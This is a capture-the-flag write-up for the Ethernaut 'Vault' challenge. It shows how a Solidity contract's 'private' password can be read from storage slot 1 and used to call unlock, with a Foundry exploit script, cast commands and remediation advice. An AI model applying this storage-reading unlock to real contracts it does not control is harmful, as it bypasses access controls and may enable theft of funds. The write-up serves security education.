# Vault — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 08 — Vault](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-vault) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Vault.sol` |
| **Solidity** | `^0.8.0` |
| **Severity** | Critical (for any “secret” stored this way) |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

The vault stores a `bytes32 private password` and unlocks when the caller supplies it. On Ethereum, **all storage is public**. `private` only removes the compiler-generated getter — it does not encrypt or hide data from `eth_getStorageAt`, Foundry `vm.load`, or explorers.

Reading slot 1 recovers the password; calling `unlock` clears `locked`.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Vault unlocked | `vaultInstance.locked() == false` |

---

## Finding

### [C-01] Cleartext secret in contract storage

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Sensitive data exposure / false confidentiality |
| **Location** | `src/Vault.sol` — `password` (slot 1) |
| **CWE** | [CWE-312](https://cwe.mitre.org/data/definitions/312.html) — Cleartext Storage of Sensitive Information |
| **SWC** | [SWC-136](https://swcregistry.io/docs/SWC-136) — Unencrypted Private Data On-Chain |

#### Storage layout

| Slot | Content |
|------|---------|
| 0 | `locked` (`bool`) |
| 1 | `password` (`bytes32`) |

#### Vulnerable pattern

```solidity
bytes32 private password; // NOT secret

function unlock(bytes32 _password) public {
    if (password == _password) {
        locked = false;
    }
}
```

#### Proof of concept

```bash
cd web3-ctf-challenges/08-ethernaut-vault
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 39976)
```

---

## Attack scenario

### 7-question gate

| Step | Answer |
|------|--------|
| **1. Setup** | Read storage slot 1 |
| **2. Call** | `unlock(password)` |
| **3. Result** | `locked == false` |
| **4. Cost** | Gas only |
| **5. ROI** | Full unlock |
| **6. Privileged?** | No |
| **7. Viable?** | Yes |

Alternate: recover password from the Vault factory deployment transaction constructor calldata (Ethernaut uses `keccak256("A very strong secret password :)")`).

---

## Exploit implementation

### SCH (`Exploit.s.sol`)

```solidity
function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    bytes32 password = vm.load(address(vaultInstance), bytes32(uint256(1)));
    vaultInstance.unlock(password);

    vm.stopBroadcast();
}
```

Off-platform equivalent: `cast storage <vault> 1` then `cast send <vault> "unlock(bytes32)" <password>`.

---

## Remediation

- Do not store secrets on-chain in any visibility.
- Prefer signatures, commit-reveal with off-chain preimage, or ZK.
- Assume every slot is world-readable.

---

## Key lessons

1. **`private` ≠ confidential** — it is an ABI/compiler restriction.
2. **Blockchain data is permanent and public** — including constructor args.
3. **Map storage layouts** when auditing access to “hidden” state.

---

## References

- [SCH Vault challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-vault)
- [SWC-136: Unencrypted Private Data On-Chain](https://swcregistry.io/docs/SWC-136)
- Local: `Exploit.s.sol`, `test/VaultExploit.t.sol`
